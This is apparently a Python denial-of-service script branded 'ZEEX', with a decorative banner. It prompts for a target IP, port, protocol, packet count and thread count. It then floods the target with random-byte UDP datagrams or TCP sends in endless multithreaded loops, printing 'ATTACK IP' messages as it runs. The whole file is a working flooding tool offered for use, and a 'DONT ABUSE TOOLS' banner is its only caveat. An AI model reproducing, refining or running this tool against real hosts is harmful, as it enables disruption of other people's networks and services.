import random
import socket
import threading
import time
import os,sys

os.system("clear")
print(" \033[36m---------------------")
time.sleep(1)
print("\033[36m | TOOLS BY ZEEX     |")
time.sleep(1)
print("\033[36m | DONT ABUSE TOOLS  |")
time.sleep(1)
print("\033[36m | JOIN MY COMMUNITY |")
time.sleep(1)
print(" ---------------------")
time.sleep(3)
os.system("clear")
print("\033[36m")
print("""
 __        _____ ____  _   _    
 \ \      / /_ _| __ )| | | |   
  \ \ /\ / / | ||  _ \| | | |   
   \ V  V /  | || |_) | |_| |   
    \_/\_/__|___|____/ \___/___ 
    / \  | __ )  / \  |  _ \_ _|
   / _ \ |  _ \ / _ \ | | | | | 
  / ___ \| |_) / ___ \| |_| | | 
 /_/   \_\____/_/   \_\____/___|
                                """)
ip = str(input("\033[91mHOST/IP : \033[36m"))
port = int(input("\033[91mPORT    : \033[36m"))
choice = str(input("\033[91mMethod  : \033[36m"))
times = int(input("\033[91mPACKET  : \033[36m"))
threads = int(input("\033[91mTHREAD  : \033[36m"))
os.system("clear")
def run():
    data = random._urandom(805)
    i = random.choice(("[ZEEX]","[ZEEX]","[ZEEX]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print("\033[91mATTACK IP \033[36m%s \033[91mAND PORT \033[36m%s"%(ip,port))
        except:
            print("Wibu")

def run2():
    data = random._urandom(805)
    i = random.choice(("[ZEEX]","[ZEEX]","[ZEEX]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print("\033[91mATTACK IP\033[36m%s \033[91mAND PORT\033[36m%s"%(ip,port))
        except:
            s.close()
            print("Wibu")

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = run)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = run2)
        th.start()